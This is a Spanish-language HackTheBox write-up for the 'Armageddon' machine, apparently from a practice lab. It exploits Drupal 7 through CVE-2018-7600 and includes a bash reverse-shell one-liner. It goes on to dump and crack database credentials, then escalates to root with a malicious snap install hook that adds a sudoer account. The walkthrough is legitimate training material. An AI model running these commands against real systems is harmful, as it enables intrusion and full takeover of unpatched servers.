---
tags:
title: Armegeddon - Easy (HTB)
permalink: /Armegeddon-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,80 10.129.48.89
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-07 16:54 -0300
Nmap scan report for 10.129.48.89
Host is up (1.0s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.06 seconds
```

## Website 

El sitio original tiene una interfaz parecida a la de `Drupal`.

![image-center](/assets/images/Pasted image 20260107165529.png)
## Shell as apache
### Drupal 7 exploit

Viendo uno de los archivos del escaneo de `nmap`, me revela la versión de Drupal que corre para esta pagina.

![image-center](/assets/images/Pasted image 20260107170355.png)

En este [repositorio](https://github.com/pimps/CVE-2018-7600) encontré un exploit para esta versión, donde ejecute un `curl` de prueba.

```bash
root@zsln:/home/zsln/Desktop/zsln/htb/armaggedon/CVE-2018-7600# python3 drupa7-CVE-2018-7600.py -c 'curl http://10.10.17.19' http://armageddon.htb

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-ef9PyQ328WOFYK7wJPrTwOrNQVm2yxI2onGfZEXYuNw
[*] Triggering exploit to execute: curl http://10.10.17.19
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="allPorts">allPorts</a></li>
<li><a href="CVE-2018-7600/">CVE-2018-7600/</a></li>
<li><a href="droopescan/">droopescan/</a></li>
<li><a href="drupal.sh">drupal.sh</a></li>
<li><a href="dump-database-d6.sh">dump-database-d6.sh</a></li>
<li><a href="dump-database-d7.sh">dump-database-d7.sh</a></li>
<li><a href="password-hash.sh">password-hash.sh</a></li>
</ul>
<hr>
</body>
</html>

```

Y desde mi servidor `python` recibo la solicitud.

```bash
python3 -m http.server 80     
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.48.89 - - [07/Jan/2026 17:13:04] "GET / HTTP/1.1" 200 -
```
### Reverse shell

Por lo que ejecute la siguiente linea de `bash` para obtener una shell.

```bash
root@zsln:/home/zsln/Desktop/zsln/htb/armaggedon/CVE-2018-7600# python3 drupa7-CVE-2018-7600.py -c 'bash -c "bash -i >& /dev/tcp/10.10.17.19/4444 0>&1"' http://armageddon.htb

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-ZQuoXWhGrdCE0wFsK5luFNNngb1BfvvQiF7NcWZ3XEw
[*] Triggering exploit to execute: bash -c "bash -i >& /dev/tcp/10.10.17.19/4444 0>&1"
```

Y desde mi listener `nc` recibo la conexión como el usuario `apache`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.48.89] 42902
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
```
## Shell as brucetherealadmin
### MySQL database creds

Viendo el contenido de `settings.php` veo credenciales de `conexion` para la base de datos de `MySQL`.

```bash
bash-4.2$ cat cat /var/www/html/sites/default/settings.php
<SNIP>
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

```
### Enum databases and tables

Enumere bases de datos, y tablas.

```bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "show databases;"
Database
information_schema
drupal
mysql
performance_schema
bash-4.2$ mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "show databases; use drupal; show tables;"
<er -pCQHEy@9M*m23gBVj -e "show databases; use drupal; show tables;"         
Database
information_schema
drupal
mysql
performance_schema
Tables_in_drupal
actions
<SNIP>
url_alias
users
users_roles
variable
watchdog
```

Y luego dumpee el contenido de la tabla `users`.

```bash
watchdog
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language       picture  init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html  1606998756       1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
3       zsln    $S$DdxS6dtnT9MqhjfBs89QnZm/u5k07YUyQFZrYXkbCq9aAOp0XuEI test@test.com                   filtered_html   1767816262      0      00       Europe/London           0       test@test.com   NULL
```
### Crack password

El hash lo metí en un archivo, para romperlo con `john`.

```bash
root@zsln:/home/zsln/Desktop/zsln/htb/armaggedon/CVE-2018-7600# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)     
1g 0:00:00:00 DONE (2026-01-07 17:31) 10.00g/s 2560p/s 2560c/s 2560C/s tiffany..freedom
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Auth

Use las mismas para conectarme por `ssh`.

```bash
 ssh brucetherealadmin@armageddon.htb 
brucetherealadmin@armageddon.htbs password: 
Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2
[brucetherealadmin@armageddon ~]$ cat user.txt 
181688175b02364239ec44f83792edeb
```
## Shell as root

### Sudo rights

Viendo mis privilegios con `sudo` veo que puedo ejecutar `snap install *`.

```bash
sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

### Create hook

Para lograr acceder a `root` tengo que crear un `.snap` malicioso, para eso primero necesito la estructura.

```bash
# Crear estructura
mkdir -p xxsnap/meta/hooks
```

Luego creo el `hook`, creando un usuario , con privilegios `SUDO` a nivel global y por ultimo dándole permisos de ejecución.

```bash
cat > xxsnap/meta/hooks/install << 'EOF'
#!/bin/bash
useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG wheel dirty_sock
echo "dirty_sock ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF

chmod +x xxsnap/meta/hooks/install
```
### YAML file

Luego creo un archivo `yaml` con la estructura de un archivo de instalación de `snap`.

```
# Crear snap.yaml
cat > xxsnap/meta/snap.yaml << 'EOF'
name: xxsnap
version: '0.1'
summary: Empty snap
description: |
  Privilege escalation snap
architectures:
- amd64
confinement: devmode
grade: devel
EOF
```

Y luego con `mksquashfs` lo empaqueto en el directorio creado.

```bash
cd /tmp/xxsnap
mksquashfs . ../xxsnap_0.1_all.snap -noappend -comp xz -no-xattrs -no-fragments

```
### Install 

Ya por ultimo, lo instalo abusando de los privilegios `sudo`.

```
sudo /usr/bin/snap install /tmp/xxsnap_0.1_all.snap --dangerous --devmode
```
### Check sudo rights

Y ahora puedo migrar al usuario que cree en el `hook`.

```
su dirty_sock
```

La password es su mismo nombre, para poder verificar así los privilegios, viendo que con `sudo` puedo ejecutar cualquier comando, equivalente a los permisos de `root`.

```bash
[brucetherealadmin@armageddon xxsnap]$ su dirty_sock
Password: 
[dirty_sock@armageddon xxsnap]$ sudo -l

<SNIP>

User dirty_sock may run the following commands on armageddon:
    (ALL) ALL
    (ALL : ALL) ALL
```
### Shell

Así que ahora ya puedo convertirme el `root` ejecutando con sudo una `bash`.

```bash
[dirty_sock@armageddon xxsnap]$ sudo bash
[root@armageddon xxsnap]# whoami
root
```

```bash
[root@armageddon xxsnap]# cat /root/root.txt 
c7b0bdf6f98f43739ed79e7b38db9a4e
```

`~Happy Hacking.`